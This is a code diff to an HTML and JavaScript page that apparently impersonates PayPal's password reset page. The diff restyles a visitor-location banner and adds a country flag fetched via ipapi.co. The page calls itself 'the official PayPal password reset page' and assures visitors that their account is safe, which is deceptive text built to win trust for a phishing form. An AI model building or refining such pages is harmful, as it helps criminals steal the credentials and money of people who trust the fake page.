@@ -177,12 +177,13 @@
     </div>
   </header>
   <!-- Middle User Info Section -->
-  <div class="user-info" id="user-info" style="text-align: center; margin: 30px 0; font-size: 15px; color: #555;">
-    <span id="country">Country: Loading...</span>
+<div class="user-info-container">
+  <div class="user-info-card" id="user-info">
+    <span id="country"><img id="country-flag" src="" alt="Flag" class="flag-img"> Country: Loading...</span>
     <span id="city">City: Loading...</span>
     <span id="time">Local Time: Loading...</span>
   </div>
-
+</div>
   <!-- Main Reset Password Container -->
   <main class="reset-password-container">
     <h2 class="page-title">Reset Your Password</h2>
@@ -229,8 +230,9 @@
       <button type="submit" class="btn btn-primary" id="resetPasswordBtn">Approve Reset Password</button>
     </form>
     <!-- Bottom Reassurance Text -->
-  <div class="footer-text" style="text-align:center; margin-top: 30px; font-size: 14px; color: #666;">
-    You are on the official PayPal password reset page. Rest assured, your account is safe and secure.
+  <div class="footer-text">
+  <span class="shield">🛡️</span>
+  <span class="reassurance-text">You are on the official PayPal password reset page. Rest assured, your account is safe and secure.</span>
   </div>
     
   </main>
@@ -276,6 +278,13 @@ async function fetchUserData() {
     const res = await fetch('https://ipapi.co/json/');
     const data = await res.json();
 
+    // Use country flag emoji
+    const countryCode = data.country_code || 'US'; // fallback
+    const flagEmoji = countryCode
+      .toUpperCase()
+      .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
+
+    document.getElementById('country-flag').src = `https://flagcdn.com/16x12/${data.country_code.toLowerCase()}.png`;
     document.getElementById('country').textContent = `Country: ${data.country_name || 'N/A'}`;
     document.getElementById('city').textContent = `City: ${data.city || 'N/A'}`;
     document.getElementById('time').textContent = `Local Time: ${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}`;
